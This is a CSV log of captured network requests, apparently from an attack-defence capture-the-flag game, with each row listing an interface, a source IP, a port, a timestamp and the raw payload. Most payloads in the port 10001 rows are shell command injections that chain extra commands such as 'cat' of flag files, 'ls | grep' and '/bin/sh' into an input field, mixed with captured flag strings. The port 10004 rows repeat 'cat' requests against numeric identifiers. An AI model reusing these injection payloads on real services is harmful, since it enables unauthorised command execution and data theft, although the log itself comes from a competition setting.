interface/src_ip/src_eth/dst_port,last_req_time,time_btw_req,all_data
tun0/10.9.12.1/undefined/10001,2022-02-19 17:51:14.872414,0,"a;echo ""==="";cat *3f7b1g1s5m5c5a4s3p0m*;echo ""==="";--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --ll; cat `ls|grep 3f7b1g1s5m5c5a4s3p0m`--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --test; cat 3f7b1g1s5m5c5a4s3p0m*; echo--a;cat 3f7b1g1s5m5c5a4s3p0m*;aa 123--3f7b1g1s5m5c5a4s3p0m--2o4n4k6q9l1f0c9u5j2g--a;echo ""==="";cat *3f7b1g1s5m5c5a4s3p0m*;echo ""==="";--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2 3f7b1g1s5m5c5a4s3p0m*;  3--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --a;echo ""==="";cat *3f7b1g1s5m5c5a4s3p0m*;echo ""==="";--2 some;cat 3f7b1g1s5m5c5a4s3p0m*;echo;  3 --a;cat 3f7b1g1s5m5c5a4s3p0m*;aa 123--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --;cat *;--a; /bin/sh; cat a--cat 3f7b1g1s5m5c5a4s3p0m*--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --a;echo ""==="";cat *3f7b1g1s5m5c5a4s3p0m*;echo ""==="";--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --a;cat 3f7b1g1s5m5c5a4s3p0m*;aa 123--2 a;ls | grep 3f7b1g1s5m5c5a4s3p0m;  --3f7b1g1s5m5c5a4s3p0m--*; ls -la;--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --a;echo ""==="";cat *3f7b1g1s5m5c5a4s3p0m*;echo ""==="";--0w6y6b3r7v7m4v3a9j3d--*; ls -la;--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --a;cat 3f7b1g1s5m5c5a4s3p0m*;aa 123--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2i0q4c0g8d0h7u7q5r0i--*; ls -la;--a; /bin/sh; cat a--cat 3f7b1g1s5m5c5a4s3p0m*--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --a;echo ""==="";cat *3f7b1g1s5m5c5a4s3p0m*;echo ""==="";--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --a;cat 3f7b1g1s5m5c5a4s3p0m*;aa 123--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --a;echo ""==="";cat *3f7b1g1s5m5c5a4s3p0m*;echo ""==="";--test; cat 3f7b1g1s5m5c5a4s3p0m*; echo--cat 3f7b1g1s5m5c5a4s3p0m*--ll; cat `ls|grep 3f7b1g1s5m5c5a4s3p0m`--a; /bin/sh; cat a--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --a;cat 3f7b1g1s5m5c5a4s3p0m*;aa 123--3f7b1g1s5m5c5a4s3p0m*;--3f7b1g1s5m5c5a4s3p0m*;--a;echo ""==="";cat *3f7b1g1s5m5c5a4s3p0m*;echo ""==="";--0r3t8i4h4i9s0d7y7u5d--8k4n5n4q0w6w0z0n6h8g--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --7KT9Zvo6JC--; cat 3f7b1g1s5m5c5a4s3p0m_*;--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --3f7b1g1s5m5c5a4s3p0m--*; ls -la;--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --cat 3f7b1g1s5m5c5a4s3p0m*--a; /bin/sh; cat a--ll; cat `ls|grep 3f7b1g1s5m5c5a4s3p0m`--cat 3f7b1g1s5m5c5a4s3p0m*--a; /bin/sh; cat a--a;echo ""==="";cat *3f7b1g1s5m5c5a4s3p0m*;echo ""==="";--a;cat 3f7b1g1s5m5c5a4s3p0m*;aa 123--somename somepwd 1 10 file /tmp/abcd 2 3f7b1g1s5m5c5a4s3p0m *--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --a;echo ""==="";cat *0r3t8i4h4i9s0d7y7u5d*;echo ""==="";--;cat *;--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --a;cat 0r3t8i4h4i9s0d7y7u5d*;aa 123--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --a;echo ""==="";cat *0r3t8i4h4i9s0d7y7u5d*;echo ""==="";--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --a;cat 0r3t8i4h4i9s0d7y7u5d*;aa 123--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --a;echo ""==="";cat *0r3t8i4h4i9s0d7y7u5d*;echo ""==="";--a; /bin/sh; cat a--cat 0r3t8i4h4i9s0d7y7u5d*--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --0r3t8i4h4i9s0d7y7u5d--8k4n5n4q0w6w0z0n6h8g--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --test; cat 0r3t8i4h4i9s0d7y7u5d*; echo--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --a;cat 0r3t8i4h4i9s0d7y7u5d*;aa 123--a;echo ""==="";cat *0r3t8i4h4i9s0d7y7u5d*;echo ""==="";--0r3t8i4h4i9s0d7y7u5d--*; ls -la;--cat 0r3t8i4h4i9s0d7y7u5d*--a; /bin/sh; cat a--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2 a;ls | grep 0r3t8i4h4i9s0d7y7u5d;  --a;echo ""==="";cat *0r3t8i4h4i9s0d7y7u5d*;echo ""==="";--0w6y6b3r7v7m4v3a9j3d--*; ls -la;--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --a;cat 0r3t8i4h4i9s0d7y7u5d*;aa 123--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2i0q4c0g8d0h7u7q5r0i--*; ls -la;--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --ll; cat `ls|grep 0r3t8i4h4i9s0d7y7u5d`--a;echo ""==="";cat *0r3t8i4h4i9s0d7y7u5d*;echo ""==="";--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --1c6c6q1k2k3m6x2m7h0l--FLGcsUJYCtXYtRaQ--FLGcMo0zNHKg1Go--9o1s8h9o1--1c6c6q1k2k3m6x2m7h0l--FLGcsUJYCtXYtRaQ--1c6c6q1k2k3m6x2m7h0l--FLGN3GClztOeDytR--7g5k9x8n1t1r4q3d1x5h3q7r4x2r0k6l7k0t6t7uFLG0kDsiP6lPkmIm7l6e5m0q2q4v4y5n0w8z5r5m3o7c0--a;cat 0r3t8i4h4i9s0d7y7u5d*;aa 123--a;echo ""==="";cat *0r3t8i4h4i9s0d7y7u5d*;echo ""==="";--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --ll; cat `ls|grep 0r3t8i4h4i9s0d7y7u5d`--2 0r3t8i4h4i9s0d7y7u5d*;  3--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2 some;cat 0r3t8i4h4i9s0d7y7u5d*;echo;  3 --2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --a;cat 0r3t8i4h4i9s0d7y7u5d*;aa 123--a;echo ""==="";cat *0r3t8i4h4i9s0d7y7u5d*;echo ""==="";--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --0r3t8i4h4i9s0d7y7u5d--*; ls -la;--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --test; cat 0r3t8i4h4i9s0d7y7u5d*; echo--a;echo ""==="";cat *0r3t8i4h4i9s0d7y7u5d*;echo ""==="";--a;cat 0r3t8i4h4i9s0d7y7u5d*;aa 123--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --a;echo ""==="";cat *0r3t8i4h4i9s0d7y7u5d*;echo ""==="";--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --a;cat 0r3t8i4h4i9s0d7y7u5d*;aa 123--;cat *;--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --a;echo ""==="";cat *0r3t8i4h4i9s0d7y7u5d*;echo ""==="";--a; /bin/sh; cat a--cat 0r3t8i4h4i9s0d7y7u5d*--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --a;cat 0r3t8i4h4i9s0d7y7u5d*;aa 123--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --a;echo ""==="";cat *0r3t8i4h4i9s0d7y7u5d*;echo ""==="";--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2 a;ls | grep 0r3t8i4h4i9s0d7y7u5d;  --0r3t8i4h4i9s0d7y7u5d--*; ls -la;--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --a;cat 0r3t8i4h4i9s0d7y7u5d*;aa 123--a;echo ""==="";cat *0r3t8i4h4i9s0d7y7u5d*;echo ""==="";--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --ll; cat `ls|grep 0r3t8i4h4i9s0d7y7u5d`--a; /bin/sh; cat a--cat 0r3t8i4h4i9s0d7y7u5d*"
tun0/10.9.12.3/undefined/10001,2022-02-19 17:51:24.350315,0,8u8d2p9q7z2a7h8h4z3j--2w9n6w1n6q3o1r5w6y2b--9m5t2i0f0t7y7v7y7g0c--2t3m7q1q7f6p7z5l3e1j--8n4p3x7c9h6c6r0g3a8y--4h0i4z5b4f0m5k9n7q0x--3k8z6v6h3e5n2n6e3q6m--2v3v5i8u1o0w8j3p7b8z--9q6b4i6q4g6r4t4g8y6c--4s0i9k1z7y5r2c3d0k7h--8k4y5h2w1s0h7s9x2v8y--0q5z2g8p6a2s8o9t6i3o--7l2z1w9m7n7j9p3k0t9c--8c4q2b6k7c3d6x4w5o1j--5r0n5r0d1g8y7d4j4y4t--8o5p4w6a2e4e2f9m9d1l--6c3y4w5m2a4x9r8v2r2x--7d9o8l4p8o7n8e3z9c0k--5z6k8b4n3r2k1l5v8y0q--3g6i5o4d4s6q0i1j2x7d--5s5u1v4x8o0t1e3j2u9t--4r8s1b4j1k5y0e0f0q3t--9v5b8r1g1k6p0t2q2z4v--8l9v6i6f6d6c4z2q1f7h--6e1y8e9p4p3a0p9y4o6a--1e3z7r9h7o2f4i5b1a9t--8t8p0u4s2u1x0m8k7w1n--7n0b3q0h8j4k5r5g5c7m
tun0/10.9.12.1/undefined/10004,2022-02-19 17:51:28.064732,0,ca-- cat 296910960--626982657 lkNFQFITLqcX3i19YdPK FLGertNO9awrxfSb--626982657 cbaSwEUWOZkGnd9vLZ0N--626982657 lkNFQFITLqcX3i19YdPK--1 aaaa bbbb--cat 296910960--ca--1 aaaa bbbb--ca--cat 296910960--4218801477 aeVmfZy4AVeb6pxwULin FLGzTWEZw7S68M42--ca--1 aaaa bbbb--cat 296910960--ca--ca-- cat 296910960--1 aaaa bbbb--ca--cat 296910960--1 aaaa bbbb--ca--cat 296910960--4218801477 aeVmfZy4AVeb6pxwULin--ca--1 aaaa bbbb--ca--cat 4218801477--1 aaaa bbbb--ca--cat 4218801477--4180290515 vnhW0R6jhc0H8J2QDpYj FLGVsBftNrSIvUpq--4180290515 xLarpwW0cmYGRY4kw3kW--4180290515 vnhW0R6jhc0H8J2QDpYj--ca--ca--ca-- cat 4218801477--1 aaaa bbbb--ca--cat 4218801477
tun0/10.9.12.3/undefined/10004,2022-02-19 17:51:43.970693,0,8675309 a a--ca--cat 636145058--8675309 a a--ca--cat 2470977204--8675309 a a--ca--cat 3652130359--8675309 a a--ca--cat 3690659946--8675309 a a--ca--cat 1098526782--8675309 a a--ca--cat 2644776535--8675309 a a--ca--cat 1151777645--8675309 a a--ca--cat 2706808969--8675309 a a--ca--cat 559103518--8675309 a a--ca--cat 1754356806--8675309 a a--ca--cat 3874208498--8675309 a a--ca--cat 2065489727--8675309 a a--ca--cat 2837655079--8675309 a a--ca--cat 1206915366--8675309 a a--ca--cat 3776554256--8675309 a a--ca--cat 1971402865--8675309 a a--ca--cat 3915921561--8675309 a a--ca--cat 4180357957--8675309 a a--ca--cat 3285525548--8675309 a a--ca--cat 3531279486--8675309 a a--ca--cat 3061337423--8675309 a a--ca--cat 107921673--8675309 a a--ca--cat 760263224--8675309 a a--ca--8675309 a a--ca--cat 1768289608--8675309 a a--ca--cat 2259963691--8675309 a a--ca--cat 3188425045--8675309 a a--ca--cat 3528806153--8675309 a a--ca--cat 1199992708--8675309 a a--ca--cat 2477535721--8675309 a a--ca--cat 1060066467--8675309 a a--ca--cat 3231664468--8675309 a a--ca--cat 2256240786--8675309 a a--ca--cat 4013119233--8675309 a a--ca--cat 1216149647--8675309 a a--ca--cat 2638965705--8675309 a a--ca--cat 461733742--8675309 a a--ca--cat 3448089962--8675309 a a--ca--cat 655350749--8675309 a a--ca--cat 2295754375--8675309 a a--ca--cat 238793229--8675309 a a--ca--cat 2927614846--8675309 a a--ca--cat 2254715557--8675309 a a--ca--cat 1341648336--8675309 a a--ca--cat 3026100418--8675309 a a--ca--cat 3426847512--8675309 a a--ca--cat 1083047714--8675309 a a--ca--cat 784126138--8675309 a a--ca--cat 1685897486--8675309 a a--ca--cat 770140707--8675309 a a--ca--cat 2259963691--8675309 a a--ca--cat 3188425045--8675309 a a--ca--cat 3528806153--8675309 a a--ca--cat 1199992708--8675309 a a--ca--cat 2477535721--8675309 a a--ca--cat 1060066467--8675309 a a--ca--cat 3231664468--8675309 a a--ca--cat 2256240786--8675309 a a--ca--cat 4013119233--8675309 a a--ca--cat 2638965705--8675309 a a--ca--cat 461733742--8675309 a a--ca
